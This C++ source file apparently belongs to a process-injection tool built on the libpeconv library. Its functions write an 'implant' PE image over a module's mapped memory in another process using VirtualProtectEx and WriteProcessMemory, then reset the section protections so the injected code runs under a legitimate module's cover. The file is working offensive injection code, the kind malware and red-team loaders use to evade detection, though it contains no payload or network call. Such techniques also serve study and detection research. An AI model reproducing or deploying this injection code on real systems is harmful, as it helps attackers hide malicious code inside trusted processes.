#include "overwrite.h"
#include <peconv.h>

DWORD translate_protect(DWORD sec_charact)
{
	if ((sec_charact & IMAGE_SCN_MEM_EXECUTE)
		&& (sec_charact & IMAGE_SCN_MEM_READ)
		&& (sec_charact & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_EXECUTE_READWRITE;
	}
	if ((sec_charact & IMAGE_SCN_MEM_EXECUTE)
		&& (sec_charact & IMAGE_SCN_MEM_READ))
	{
		return PAGE_EXECUTE_READ;
	}
	if (sec_charact & IMAGE_SCN_MEM_EXECUTE)
	{
		return PAGE_EXECUTE_READ;
	}

	if ((sec_charact & IMAGE_SCN_MEM_READ)
		&& (sec_charact & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_READWRITE;
	}
	if (sec_charact & IMAGE_SCN_MEM_READ) {
		return PAGE_READONLY;
	}

	return PAGE_READWRITE;
}

bool set_sections_access(HANDLE hProcess, PVOID remoteBase, BYTE* implant_buf, size_t implant_size)
{
	DWORD oldProtect = 0;
	// protect PE header
	if (!VirtualProtectEx(hProcess, (LPVOID)remoteBase, PAGE_SIZE, PAGE_READONLY, &oldProtect)) {
		return false;
	}
	bool is_ok = true;

	const size_t count = peconv::get_sections_count(implant_buf, implant_size);
	for (size_t i = 0; i < count; i++) {
		IMAGE_SECTION_HEADER *next_sec = peconv::get_section_hdr(implant_buf, implant_size, i);
		if (!next_sec) break;

		const DWORD sec_protect = translate_protect(next_sec->Characteristics);
		const DWORD sec_offset = next_sec->VirtualAddress;
		const DWORD sec_size = next_sec->Misc.VirtualSize;
		const LPVOID next_sec_va = (LPVOID)((ULONG_PTR)remoteBase + sec_offset);
		const DWORD protect_size = (DWORD)(implant_size - sec_offset);
		if (!VirtualProtectEx(hProcess, next_sec_va, protect_size, sec_protect, &oldProtect)) {
			is_ok = false;
		}
	}
	return is_ok;
}

bool overwrite_mapping(HANDLE hProcess, HMODULE remoteBase, BYTE* implant_buf, size_t implant_size)
{
	DWORD oldProtect = 0;
	if (!VirtualProtectEx(hProcess, (BYTE*)remoteBase, implant_size, PAGE_READWRITE, &oldProtect)) {
		std::cout << "Virtual Protect Failed!\n";
		return false;
	}
	// Write the payload to the remote process, at the Remote Base:
	SIZE_T written = 0;
	if (!WriteProcessMemory(hProcess, remoteBase, implant_buf, implant_size, &written)) {
		std::cout << "Writing to the remote process failed!\n";
		return false;
	}
	std::cout << "Written the implant!\n";
	// set access:
	bool is_ok = true;
	if (!set_sections_access(hProcess, remoteBase, implant_buf, implant_size)) {
		std::cout << "set_sections_access Failed!\n";
		is_ok = false;
	}
	std::cout << "Section access set!\n";
	return is_ok;
}
